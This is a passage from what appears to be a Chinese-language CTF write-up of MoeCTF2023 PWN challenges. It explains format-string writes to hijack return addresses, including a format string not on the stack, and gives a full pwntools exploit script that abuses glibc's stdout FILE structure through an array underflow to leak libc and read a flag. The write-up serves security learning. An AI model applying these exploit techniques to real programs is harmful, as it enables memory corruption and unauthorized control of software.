<div class="code-snippet"><pre class="code-snippet__pre"><code class="language-python language-python"><span style="color:#A0ADA0">### 32 位下两种构造方式</span><br><span style="color:#393A34">payload </span><span style="color:#999999">=</span><span style="color:#393A34"> p32</span><span style="color:#2993a3">(</span><span style="color:#393A34">dragon_hp_addr</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#B56959">%7$n</span><span style="color:#B5695977">'</span><br><span style="color:#393A34">payload </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">aaaa%9$n</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p32</span><span style="color:#2993a3">(</span><span style="color:#393A34">dragon_hp_addr</span><span style="color:#2993a3">)</span><br></code></pre></div>
<h3 id="format_level2" class="scroll-target"><a href="#format_level2"><code class="hash inline-code">#</code>format_level2</a></h3>
<p>与上一道题目基本类似, 只是游戏胜利后不会调用 <code class="inline-code">success</code> 函数了, 因此需要转换思路.</p>
<p>首先, 考虑修改 <code class="inline-code">printf@got</code> 为 <code class="inline-code">success@got</code> 的方法, 发现这是不可能的, 因为 <code class="inline-code">str</code> 每次 <code class="inline-code">read</code> 的长度只有 16 bytes, 不可能在一个 <code class="inline-code">str</code> 里完成修改 (一次输出空格的方式由于输出量过大很难成功, 而修改两次的方式又会因为第二次 <code class="inline-code">printf</code> 时 <code class="inline-code">printf@got</code> 已被局部修改而失败), 因此这个利用思路没有可实现性;</p>
<p>其次, 考虑修改 ret_addr 为 success_addr 实现劫持程序控制流, 可以利用的 ret_addr 有两个, 分别是 game_ret_addr 和 main_ret_addr, 两个返回地址都可以使用.</p>
<p>具体来讲, 由于同一个函数调用栈中两个变量的相对偏移是固定的, 因此可以泄漏任意栈地址, 加上通过 gdb 调试得到的 offset 确定返回地址的位置. 然后将返回地址放在栈上, 使用 <code class="inline-code">%hhn</code> 修改即可, 构造方式可以参考 level1.</p>
<h3 id="format_level3" class="scroll-target"><a href="#format_level3"><code class="hash inline-code">#</code>format_level3</a></h3>
<p>考点: 不在栈上的格式化字符串</p>
<p>之前没做过这个考点的题目, 趁着这次机会好好学一下.... 首先要清楚不在栈上的格式化字符串题目的难点在哪里? 可以控制的字符串变量在栈上和在 .bss 段上产生了怎样的区别呢?</p>
<p>停下来思考.</p>
<p>问题主要出在使用格式化字符串 <code class="inline-code">%hhn</code> 写入数据上, 回想前两道题目的做法, 由于输入的字符串变量在栈上, 我们只需要良好的布局 payload, 即可控制栈上的数据为我们想要修改的地址, 再计算出该数据与格式化字符串的 offset, 通过 <code class="inline-code">%offset$hhn</code> 这种形式就可以修改该数据或该数据指向的数据 (如果有的话).</p>
<p>然而, 如果可控的字符串不在栈上, 我们无法有效的布局栈, 无法计算 offset (因为用到这个字符串的时候只是会在栈上复制一个引用)以修改返回地址或者函数的 got 表, 导致无法利用.</p>
<p>不过根据 <code class="inline-code">%n</code> 的特性, 如果格式化字符串指向的栈上的数据可以被再次解引用, 那么会对二次解引用的数据进行修改.</p>
<p>也就是说,</p>
<p><code class="inline-code">03:000c│      0xffffd61c —▸ 0x804963e (talk+16)</code></p>
<p>这种栈结构可以直接把这里的 0x804963e 修改.</p>
<p><code class="inline-code">06:0018│ ebp  0xffffd628 —▸ 0xffffd648 —▸ 0xffffd658 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40</code></p>
<p>这种栈结构可以通过 %n 修改 <code class="inline-code">0xffffd658</code> 的数值, 但是无法修改它之前或之后的数据.</p>
<p>根据以上的特性, 我们再来看看这个栈:</p>
<div class="code-snippet"><pre class="code-snippet__pre"><code class="language-x86asm language-x86asm"><span style="color:#2F798A">00</span><span style="color:#393A34">:</span><span style="color:#2F798A">0000</span><span style="color:#393A34">│ </span><span style="color:#1E754F">esp</span><span style="color:#2F798A">  0xffffd610</span><span style="color:#393A34"> —▸ </span><span style="color:#2F798A">0x804c01c</span><span style="color:#393A34"> </span><span style="color:#2993a3">(</span><span style="color:#AB5959">str</span><span style="color:#2993a3">)</span><span style="color:#393A34"> ◂— </span><span style="color:#2F798A">0xa</span><span style="color:#A0ADA0"> /* '\n' */</span><br><span style="color:#393A34">... ↓</span><br><span style="color:#2F798A">02</span><span style="color:#393A34">:</span><span style="color:#2F798A">0008</span><span style="color:#393A34">│      </span><span style="color:#2F798A">0xffffd618</span><span style="color:#393A34"> ◂— </span><span style="color:#2F798A">0x10</span><br><span style="color:#2F798A">03</span><span style="color:#393A34">:000c│      </span><span style="color:#2F798A">0xffffd61c</span><span style="color:#393A34"> —▸ </span><span style="color:#2F798A">0x804963e</span><span style="color:#393A34"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">talk+</span><span style="color:#2F798A">16</span><span style="color:#2993a3">)</span><span style="color:#393A34"> ◂— </span><span style="color:#AB5959">add</span><span style="color:#1E754F">    ebx</span><span style="color:#393A34">, </span><span style="color:#2F798A">297ah</span><br><span style="color:#2F798A">04</span><span style="color:#393A34">:</span><span style="color:#2F798A">0010</span><span style="color:#393A34">│      </span><span style="color:#2F798A">0xffffd620</span><span style="color:#393A34"> —▸ </span><span style="color:#2F798A">0x804a231</span><span style="color:#393A34"> ◂— </span><span style="color:#2F798A">0x47006425</span><span style="color:#A0ADA0"> /* '%d' */</span><br><span style="color:#2F798A">05</span><span style="color:#393A34">:</span><span style="color:#2F798A">0014</span><span style="color:#393A34">│      </span><span style="color:#2F798A">0xffffd624</span><span style="color:#393A34"> —▸ </span><span style="color:#2F798A">0x804bfb8</span><span style="color:#393A34"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">_GLOBAL_OFFSET_TABLE_</span><span style="color:#2993a3">)</span><span style="color:#393A34"> —▸ </span><span style="color:#2F798A">0x804bec0</span><span style="color:#393A34"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">_DYNAMIC</span><span style="color:#2993a3">)</span><span style="color:#393A34"> ◂— </span><span style="color:#2F798A">0x1</span><br><span style="color:#2F798A">06</span><span style="color:#393A34">:</span><span style="color:#2F798A">0018</span><span style="color:#393A34">│ </span><span style="color:#1E754F">ebp</span><span style="color:#2F798A">  0xffffd628</span><span style="color:#393A34"> —▸ </span><span style="color:#2F798A">0xffffd648</span><span style="color:#393A34"> —▸ </span><span style="color:#2F798A">0xffffd658</span><span style="color:#393A34"> —▸ </span><span style="color:#2F798A">0xf7ffd020</span><span style="color:#393A34"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">_rtld_global</span><span style="color:#2993a3">)</span><span style="color:#393A34"> —▸ </span><span style="color:#2F798A">0xf7ffda40</span><span style="color:#393A34"> ◂— ...</span><br><span style="color:#2F798A">07</span><span style="color:#393A34">:001c│      </span><span style="color:#2F798A">0xffffd62c</span><span style="color:#393A34"> —▸ </span><span style="color:#2F798A">0x8049737</span><span style="color:#393A34"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">game+</span><span style="color:#2F798A">121</span><span style="color:#2993a3">)</span><span style="color:#393A34"> ◂— </span><span style="color:#AB5959">jmp</span><span style="color:#2F798A">    804975ah</span><br><span style="color:#2F798A">08</span><span style="color:#393A34">:</span><span style="color:#2F798A">0020</span><span style="color:#393A34">│      </span><span style="color:#2F798A">0xffffd630</span><span style="color:#393A34"> —▸ </span><span style="color:#2F798A">0xf7faed00</span><span style="color:#393A34"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">_IO_2_1_stderr_</span><span style="color:#2993a3">)</span><span style="color:#393A34"> ◂— </span><span style="color:#2F798A">0xfbad2087</span><br><span style="color:#2F798A">09</span><span style="color:#393A34">:</span><span style="color:#2F798A">0024</span><span style="color:#393A34">│      </span><span style="color:#2F798A">0xffffd634</span><span style="color:#393A34"> ◂— </span><span style="color:#2F798A">0x0</span><br><span style="color:#B31D28;font-style:italic">0a</span><span style="color:#999999;font-style:italic">:</span><span style="color:#2F798A">0028</span><span style="color:#393A34">│      </span><span style="color:#2F798A">0xffffd638</span><span style="color:#393A34"> ◂— </span><span style="color:#2F798A">0x3</span><br><span style="color:#2F798A">0b</span><span style="color:#393A34">:002c│      </span><span style="color:#2F798A">0xffffd63c</span><span style="color:#393A34"> ◂— </span><span style="color:#2F798A">0x3ac4d800</span><br><span style="color:#B31D28;font-style:italic">0c</span><span style="color:#999999;font-style:italic">:</span><span style="color:#2F798A">0030</span><span style="color:#393A34">│      </span><span style="color:#2F798A">0xffffd640</span><span style="color:#393A34"> ◂— </span><span style="color:#2F798A">0x1</span><br><span style="color:#2F798A">0d</span><span style="color:#393A34">:</span><span style="color:#2F798A">0034</span><span style="color:#393A34">│      </span><span style="color:#2F798A">0xffffd644</span><span style="color:#393A34"> —▸ </span><span style="color:#2F798A">0xf7fae000</span><span style="color:#393A34"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">_GLOBAL_OFFSET_TABLE_</span><span style="color:#2993a3">)</span><span style="color:#393A34"> ◂— </span><span style="color:#2F798A">0x229dac</span><br><span style="color:#B31D28;font-style:italic">0e</span><span style="color:#999999;font-style:italic">:</span><span style="color:#2F798A">0038</span><span style="color:#393A34">│      </span><span style="color:#2F798A">0xffffd648</span><span style="color:#393A34"> —▸ </span><span style="color:#2F798A">0xffffd658</span><span style="color:#393A34"> —▸ </span><span style="color:#2F798A">0xf7ffd020</span><span style="color:#393A34"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">_rtld_global</span><span style="color:#2993a3">)</span><span style="color:#393A34"> —▸ </span><span style="color:#2F798A">0xf7ffda40</span><span style="color:#393A34"> ◂— </span><span style="color:#2F798A">0x0</span><br><span style="color:#B31D28;font-style:italic">0f</span><span style="color:#999999;font-style:italic">:</span><span style="color:#393A34">003c│      </span><span style="color:#2F798A">0xffffd64c</span><span style="color:#393A34"> —▸ </span><span style="color:#2F798A">0x8049784</span><span style="color:#393A34"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">main+</span><span style="color:#2F798A">30</span><span style="color:#2993a3">)</span><span style="color:#393A34"> ◂— </span><span style="color:#AB5959">mov</span><span style="color:#1E754F">    eax</span><span style="color:#393A34">, </span><span style="color:#2F798A">0</span><br><br></code></pre></div>
<p>那么我们只需要应用这个原理构造栈就好了:</p>
<p>将 offset 为 6 处对地址解二次引用的 <code class="inline-code">0xffffd658</code> 修改为 <code class="inline-code">game</code> 的 <code class="inline-code">return address 0xffffd64c</code>, 于是 offset 为 0x0e 处的栈会变为</p>
<p><code class="inline-code">0e:0038│      0xffffd648 —▸ 0xffffd64c —▸ 0x8049784 (main+30) ◂— mov    eax, 0</code></p>
<p>那么再次应用这个原理, 修改 0x0e 处栈帧的数据时就可以直接控制返回地址为 success_addr.</p>
<h3 id="feedback" class="scroll-target"><a href="#feedback"><code class="hash inline-code">#</code>feedback</a></h3>
<p>考点: IO_FILE</p>
<p>先用 checksec 检查一下程序保护, 发现保护全开. 再用 ida 反编译, 发现程序存在一个比较明显的数组指针越界.</p>
<p>参考一下 CTF-wiki 上关于 IO_FILE 的讲解, 由于数组指针 <code class="inline-code">feedback_list</code> 在 .bss 上, 而 <code class="inline-code">stdout@glibc</code> 也在 .bss 上, 那么就可以通过数组下溢出控制到 <code class="inline-code">stdout@glibc</code> 指针, 由于 <code class="inline-code">printf</code> 输出是走 <code class="inline-code">stdout</code> 的, 所以通过控制 <code class="inline-code">vtable</code> 参数即可做到任意地址读.</p>
<p>这里我们读出 <code class="inline-code">stdin</code> 的地址后, 减去 libc.symbols[&quot;<em>IO_2_1_stdin</em>&quot;] 即可得到 libc base.</p>
<p>再根据 libc base 可以求出 puts@got, 从而得到 flag 加载的地址.</p>
<p>exp:</p>
<div class="code-snippet"><pre class="code-snippet__pre"><code class="language-python language-python"><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><br><span style="color:#393A34">proc </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">./feedback</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">log_level </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">debug</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">binary </span><span style="color:#999999">=</span><span style="color:#393A34"> proc</span><br><br><span style="color:#393A34">parent_path </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">/home/flower/CTFhub/Contests/MoeCTF2023-PWN/feedback/</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">io </span><span style="color:#999999">=</span><span style="color:#393A34"> process</span><span style="color:#2993a3">(</span><span style="color:#1e754f">[</span><span style="color:#393A34">parent_path </span><span style="color:#AB5959">+</span><span style="color:#B5695977"> '</span><span style="color:#B56959">ld-2.31.so</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#393A34">parent_path </span><span style="color:#AB5959">+</span><span style="color:#B5695977"> '</span><span style="color:#B56959">feedback</span><span style="color:#B5695977">'</span><span style="color:#1e754f">]</span><span style="color:#999999">,</span><span style="color:#B07D48"> env</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#1e754f">{</span><span style="color:#B5695977">'</span><span style="color:#B56959">LD_PRELOAD</span><span style="color:#B5695977">'</span><span style="color:#999999"> :</span><span style="color:#393A34"> parent_path </span><span style="color:#AB5959">+</span><span style="color:#B5695977"> '</span><span style="color:#B56959">libc-2.31.so</span><span style="color:#B5695977">'</span><span style="color:#1e754f">}</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">elf </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">libc </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">libc-2.31.so</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#1E754F">if</span><span style="color:#393A34"> args</span><span style="color:#999999">.</span><span style="color:#393A34">G</span><span style="color:#999999">:</span><br><span style="color:#393A34">    gdb</span><span style="color:#999999">.</span><span style="color:#393A34">attach</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> feedback</span><span style="color:#2993a3">(</span><span style="color:#393A34">index</span><span style="color:#999999">:</span><span style="color:#998418"> int</span><span style="color:#999999">,</span><span style="color:#393A34"> content</span><span style="color:#999999">:</span><span style="color:#998418"> bytes</span><span style="color:#2993a3">)</span><span style="color:#999999"> -</span><span style="color:#999999">></span><span style="color:#1E754F"> None</span><span style="color:#999999">:</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">write?</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#998418">str</span><span style="color:#1e754f">(</span><span style="color:#393A34">index</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">feedback.</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#393A34">content</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">payload1 </span><span style="color:#999999">=</span><span style="color:#393A34"> flat</span><span style="color:#2993a3">(</span><span style="color:#1e754f">[</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">fbad1800</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">feedback</span><span style="color:#2993a3">(</span><span style="color:#AB5959">-</span><span style="color:#2F798A">8</span><span style="color:#999999">,</span><span style="color:#393A34"> payload1</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">stdin_addr </span><span style="color:#999999">=</span><span style="color:#393A34"> u64</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#1e754f">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\x7f</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">False</span><span style="color:#1e754f">)</span><span style="color:#1e754f">[</span><span style="color:#AB5959">-</span><span style="color:#2F798A">6</span><span style="color:#999999">:</span><span style="color:#1e754f">]</span><span style="color:#999999">.</span><span style="color:#393A34">ljust</span><span style="color:#1e754f">(</span><span style="color:#2F798A">8</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"stdin_addr ===> </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">stdin_addr</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">libc_addr </span><span style="color:#999999">=</span><span style="color:#393A34"> stdin_addr </span><span style="color:#AB5959">-</span><span style="color:#393A34"> libc</span><span style="color:#999999">.</span><span style="color:#393A34">symbols</span><span style="color:#2993a3">[</span><span style="color:#B5695977">"</span><span style="color:#B56959">_IO_2_1_stdin_</span><span style="color:#B5695977">"</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"libc_addr ===> </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">libc_addr</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">flag_addr </span><span style="color:#999999">=</span><span style="color:#393A34"> libc_addr </span><span style="color:#AB5959">+</span><span style="color:#393A34"> libc</span><span style="color:#999999">.</span><span style="color:#393A34">symbols</span><span style="color:#2993a3">[</span><span style="color:#B5695977">'</span><span style="color:#B56959">puts</span><span style="color:#B5695977">'</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> +</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">16d2e0</span><br><br><span style="color:#393A34">payload2 </span><span style="color:#999999">=</span><span style="color:#393A34"> flat</span><span style="color:#2993a3">(</span><span style="color:#1e754f">[</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">fbad1800</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#393A34"> flag_addr</span><span style="color:#999999">,</span><span style="color:#393A34"> flag_addr </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">50</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">feedback</span><span style="color:#2993a3">(</span><span style="color:#AB5959">-</span><span style="color:#2F798A">8</span><span style="color:#999999">,</span><span style="color:#393A34"> payload2</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br></code></pre></div>
<h2 id class="scroll-target"><a href="#"><code class="hash inline-code">#</code>总结</a></h2>
<p>这次 Moe 复现还是补充了一些细微的知识点的, 以后打 pwn 需要注意的点有:</p>
<ul>
<li>linux 文件描述符</li>
<li>栈不会被初始化</li>
<li><code class="inline-code">call</code> 指令跳转时使用的是相对偏移量</li>
<li>注意字节序在构造 payload 时的影响</li>
<li>手写特殊的 shellcode 的能力</li>
<li>数组指针越界漏洞 (下溢或者上溢)</li>
</ul></div></div></div><footer class="footer"><div class="footer-row footer-links"><span class="footer-label">保持联系</span><a href="mailto:xzy1476569428@163.com" class="footer-link"><p><a href="mailto:xzy1476569428@163.com" title="mailto:xzy1476569428@163.com">xzy1476569428@163.com</a></p></a><span aria-hidden="true" class="footer-separator">·</span><a href="/rss.xml" class="footer-link">RSS</a><span aria-hidden="true" class="footer-separator">·</span><a href="https://github.com/LittFlower/my_blog" class="footer-link"><p>GitHub</p></a></div><div class="footer-row footer-meta"><span><p>本站基于
<a href="https://github.com/unvariant/blog">unvariant/blog</a>
改造，除特别说明外内容以 CC BY 4.0 协议共享。</p></span></div></footer></body></html>